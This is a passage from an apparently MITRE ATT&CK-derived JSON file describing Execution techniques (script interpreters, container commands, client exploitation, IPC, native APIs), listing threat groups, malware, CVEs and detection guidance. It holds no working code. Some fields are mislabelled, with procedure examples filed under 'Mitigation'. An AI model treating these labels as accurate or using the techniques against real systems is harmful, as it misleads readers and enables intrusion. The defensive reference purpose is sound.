    "Description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.There are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.[1][2][3]",
    "Mitigation": [
      {
        "id": "G0073",
        "name": "APT19",
        "description": "APT19 downloaded and launched code within a SCT file.[4]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has used COM scriptlets to download Cobalt Strike beacons.[5]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 has used Ruby scripts to execute payloads.[6]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has utilized AutoIt and custom scripts to perform internal reconnaissance.[7][8]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook can support commands to execute Java-based payloads.[9]"
      },
      {
        "id": "S0486",
        "name": "Bonadan",
        "description": "Bonadan can create bind and reverse shells on the infected system.[10]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "CHOPSTICK is capable of performing remote command execution.[11][12]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet can execute various types of scripts on the victim’s machine.[13]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut can generate shellcode outputs that execute via Ruby.[14]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has used the command line for execution.[15]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire uses a command-line interface to interact with systems.[16]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[17]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[18][19]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 used SQL scripts to help perform tasks on the victim's machine.[20][21][20]"
      },
      {
        "id": "S0618",
        "name": "FIVEHANDS",
        "description": "FIVEHANDS can receive a command line argument to limit file encryption to specified directories.[22][23]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used a Perl reverse shell to communicate with C2.[24]"
      },
      {
        "id": "S0460",
        "name": "Get2",
        "description": "Get2 has the ability to run executables with command-line arguments.[25]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT is able to open a remote shell to execute commands.[26][27]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.[28]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Malware used by Ke3chang can run commands on the command-line interface.[29][30]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel can create a reverse shell between the infected host and a specified system.[10]"
      },
      {
        "id": "S0167",
        "name": "Matryoshka",
        "description": "Matryoshka is capable of providing Meterpreter shell access.[31]"
      },
      {
        "id": "S0530",
        "name": "Melcoz",
        "description": "Melcoz has been distributed through an AutoIt loader script.[32]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used various types of scripting for execution.[33][34][35][36][37]"
      },
      {
        "id": "C0005",
        "name": "Operation Spalax",
        "description": "For Operation Spalax, the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.[38]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell has the ability to create reverse shells with Perl scripts.[39]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has executed a Lua script through a Lua interpreter for Windows.[40]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp uses Perl scripts.[41]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware uses WMI to script data collection and command execution on the victim.[42]"
      },
      {
        "id": "G0107",
        "name": "Whitefly",
        "description": "Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands.[43]"
      },
      {
        "id": "G0124",
        "name": "Windigo",
        "description": "Windigo has used a Perl script for information gathering.[10]"
      },
      {
        "id": "S0219",
        "name": "WINERACK",
        "description": "WINERACK can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.[44]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda can launch remote scripts on the victim’s machine.[45]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor for events associated with scripting execution, such as the loading of modules associated with scripting languages (ex: JScript.dll or vbscript.dll)."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor log files for process execution through command-line and scripting activities. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner, or other information that may reveal abuse of system features. For example, consider monitoring for Windows Event ID (EID) 400, which shows the version of PowerShell executing in the EngineVersion field (which may also be relevant to detecting a potential Downgrade Attack) as well as if PowerShell is running locally or remotely in the HostName field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.[50]"
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1059.001",
        "name": "PowerShell"
      },
      {
        "id": "T1059.002",
        "name": "AppleScript"
      },
      {
        "id": "T1059.003",
        "name": "Windows Command Shell"
      },
      {
        "id": "T1059.004",
        "name": "Unix Shell"
      },
      {
        "id": "T1059.005",
        "name": "Visual Basic"
      },
      {
        "id": "T1059.006",
        "name": "Python"
      },
      {
        "id": "T1059.007",
        "name": "JavaScript"
      },
      {
        "id": "T1059.008",
        "name": "Network Device CLI"
      },
      {
        "id": "T1059.009",
        "name": "Cloud API"
      }
    ],
    "Tactic": "\nExecution"
  },
  {
    "Title": "Container Administration Command",
    "Code": "T1609",
    "Description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.[1][2][3]In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container.[4][5] In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as kubectl exec.[6]",
    "Mitigation": [
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard was executed through the kubelet API run command and by executing commands on running containers.[7]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing was executed with an Ubuntu container entry point that runs shell scripts.[8]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates can use kubectl or the Kubernetes API to run commands.[9]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.[10]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor commands and arguments executed by container services. In Docker, the daemon log provides insight into events at the daemon and container service level. Kubernetes system component logs may also detect activities running in and out of containers in the cluster."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Container administration service activities and executed commands can be captured through logging of process execution with command-line arguments on the container as well as within the underlying host."
      }
    ],
    "Subtechniques": "\nExecution"
  },
  {
    "Title": "Exploitation for Client Execution",
    "Code": "T1203",
    "Description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:Browser-based ExploitationWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
    "Mitigation": [
      {
        "id": "G0018",
        "name": "admin@338",
        "description": "admin@338 has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158.[1]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery.[2]"
      },
      {
        "id": "G0138",
        "name": "Andariel",
        "description": "Andariel has exploited numerous ActiveX vulnerabilities, including zero-days.[3][4][5]"
      },
      {
        "id": "G1007",
        "name": "Aoqin Dragon",
        "description": "Aoqin Dragon has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.[6]"
      },
      {
        "id": "G0005",
        "name": "APT12",
        "description": "APT12 has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).[7][8]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.[9]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.[10][11][12]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.[13][14]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)[15]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).[16][17]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.[18][19][20][21]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.[22]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.[23]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.[24]"
      },
      {
        "id": "G1002",
        "name": "BITTER",
        "description": "BITTER has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.[25][26]"
      },
      {
        "id": "G0098",
        "name": "BlackTech",
        "description": "BlackTech has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.[27]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.[28][29]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.[30][31][32][33][34][35][36][37]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.[38][39]"
      },
      {
        "id": "G0142",
        "name": "Confucius",
        "description": "Confucius has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.[40][41]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.[42]"
      },
      {
        "id": "S0243",
        "name": "DealersChoice",
        "description": "DealersChoice leverages vulnerable versions of Flash to perform execution.[43]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.[44]"
      },
      {
        "id": "G0066",
        "name": "Elderwood",
        "description": "Elderwood has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.[45]"
      },
      {
        "id": "G1003",
        "name": "Ember Bear",
        "description": "Ember Bear has exploited Microsoft Office vulnerability CVE-2017-11882.[46]"
      },
      {
        "id": "S0396",
        "name": "EvilBunny",
        "description": "EvilBunny has exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader.[47]"
      },
      {
        "id": "G1011",
        "name": "EXOTIC LILY",
        "description": "EXOTIC LILY has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML.[48]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors exploited CVE-2017-11882 to execute code on the victim's machine.[49]"
      },
      {
        "id": "S0391",
        "name": "HAWKBALL",
        "description": "HAWKBALL has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload.[50]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa has exploited CVE-2018-0798 for execution.[51]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.[52][53][54][55]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.[56]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.[24]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.[57][58][59][60]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution.[61]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has exploited CVE-2017-0199 in Microsoft Word to execute code.[62]"
      },
      {
        "id": "C0016",
        "name": "Operation Dust Storm",
        "description": "During Operation Dust Storm, the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.[63]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.[64][65][66][67][68][69][70]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.[71][72]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).[73][74][75]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.[76][77]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager. [78]"
      },
      {
        "id": "S0578",
        "name": "SUPERNOVA",
        "description": "SUPERNOVA was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).[79][80]"
      },
      {
        "id": "G0062",
        "name": "TA459",
        "description": "TA459 has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.[81]"
      },
      {
        "id": "G0089",
        "name": "The White Company",
        "description": "The White Company has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.[82]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has exploited CVE-2018-0798 in Equation Editor.[83]"
      },
      {
        "id": "G0131",
        "name": "Tonto Team",
        "description": "Tonto Team has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.[84][85][86][87]"
      },
      {
        "id": "G0134",
        "name": "Transparent Tribe",
        "description": "Transparent Tribe has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.[88]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.[89][90]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT has relied on CVE-2022-30190 (Follina) for execution during delivery.[91]"
      },
      {
        "id": "S0341",
        "name": "Xbash",
        "description": "Xbash can attempt to exploit known vulnerabilities in Hadoop, Redis, or ActiveMQ when it finds those services running in order to conduct further execution.[92][93]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for abnormal process creations, such as a Command and Scripting Interpreter spawning from a potentially exploited application. Also look for other behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser or Office processes."
      }
    ],
    "Subtechniques": "\nExecution"
  },
  {
    "Title": "Inter-Process Communication",
    "Code": "T1559",
    "Description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes.[1] Higher level execution mediums, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also use Remote Services such as Distributed Component Object Model to facilitate remote IPC execution.[2]",
    "Mitigation": [
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink has the ability to create a pipe to enable inter-process communication.[3]"
      },
      {
        "id": "S0537",
        "name": "HyperStack",
        "description": "HyperStack can connect to the IPC$ share on remote machines.[4]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "When executing with non-root permissions, RotaJakiro uses the the shmget API to create shared memory between other known RotaJakiro processes. This allows processes to communicate with each other and share their PID.[5]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos has the ability to move data between its kernel and user mode components, generally using named pipes.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Access",
        "detects": "Monitor for processes making abnormal calls to higher privileged processes, such as a user application connecting to a VPN service.[17]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that are associated with abuse of IPC mechanisms"
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1559.001",
        "name": "Component Object Model"
      },
      {
        "id": "T1559.002",
        "name": "Dynamic Data Exchange"
      },
      {
        "id": "T1559.003",
        "name": "XPC Services"
      }
    ],
    "Tactic": "\nExecution"
  },
  {
    "Title": "Native API",
    "Code": "T1106",
    "Description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.[1][2] These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.Native API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.[3][4][5] For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes.[6][7] This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.[8][9][10]Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.[11][12][13][14]Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.[15] Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
    "Mitigation": [
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL is capable of starting a process using CreateProcess.[16]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey has used a variety of Windows API calls, including GetComputerNameA, GetUserNameA, and CreateProcessA.[17]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed has the ability to use multiple dynamically resolved API calls.[18]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.[19]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has used the Windows API to execute code within a victim's system.[20]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to launch files using ShellExecute.[21]"
      },
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT has the ability to use OS APIs including CheckRemoteDebuggerPresent.[22]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor's dispatcher has used CreateProcessW API for execution.[23]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon has used the Windows Crypto API to generate an AES key.[24]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has used a variety of Windows API calls, including NtCurrentPeb and GetLogicalDrives.[25]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk can use multiple Windows API calls for actions on compromised hosts including discovery and execution.[26][27][28]"
      },
      {
        "id": "S0475",
        "name": "BackConfig",
        "description": "BackConfig can leverage API functions such as ShellExecuteA and HttpOpenRequestA in the process of downloading and executing files.[29]"
      },
      {
        "id": "S0606",
        "name": "Bad Rabbit",
        "description": "Bad Rabbit has used various Windows API calls.[30]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can utilize Native API functions such as, ToolHelp32 and Rt1AdjustPrivilege to enable SeDebugPrivilege on a compromised machine.[31]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "BADNEWS has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.[32][33]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook has used the ShellExecuteW() function call.[34]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().[35]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can use various APIs to allocate memory and facilitate code execution/injection.[36]"
      },
      {
        "id": "S0470",
        "name": "BBK",
        "description": "BBK has the ability to use the CreatePipe API to add a sub-process for execution via cmd.[37]"
      },
      {
        "id": "S0574",
        "name": "BendyBear",
        "description": "BendyBear can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.[38]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has used the Windows API to communicate with the Service Control Manager to execute a thread.[39]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer has used dynamic API resolution to avoid identifiable strings within the binary, including RegEnumKeyW.[40]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta has the ability to use native APIs for numerous functions including discovery and defense evasion.[41][42][43][44]"
      },
      {
        "id": "G0098",
        "name": "BlackTech",
        "description": "BlackTech has used built-in API functions.[45]"
      },
      {
        "id": "S0521",
        "name": "BloodHound",
        "description": "BloodHound can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.[46]"
      },
      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon has used Windows API calls to obtain information about the compromised host.[47]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can call multiple Windows APIs for execution, to share memory, and defense evasion.[48][49]"
      },
      {
        "id": "S0471",
        "name": "build_downer",
        "description": "build_downer has the ability to use the WinExec API to execute malware on a compromised host.[37]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can use multiple Native APIs.[50][51]"
      },
      {
        "id": "S0693",
        "name": "CaddyWiper",
        "description": "CaddyWiper has the ability to dynamically resolve and use APIs, including SeTakeOwnershipPrivilege.[52]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.[53]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes used the CreateFileW() API function with read permissions to access downloaded payloads.[54]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used direct Windows system calls by leveraging Dumpert.[55]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can use Windows API including WinExec for execution.[56]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop has used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc().[57][58]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike's Beacon payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe[59][60][61]"
      },
      {
        "id": "S0126",
        "name": "ComRAT",
        "description": "ComRAT can load a PE file from memory or the file system and execute it with CreateProcessW.[62]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti has used API calls during execution.[63][64]"
      },
      {
        "id": "S0614",
        "name": "CostaBricks",
        "description": "CostaBricks has used a number of API calls, including VirtualAlloc, VirtualFree, LoadLibraryA, GetProcAddress, and ExitProcess.[65]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
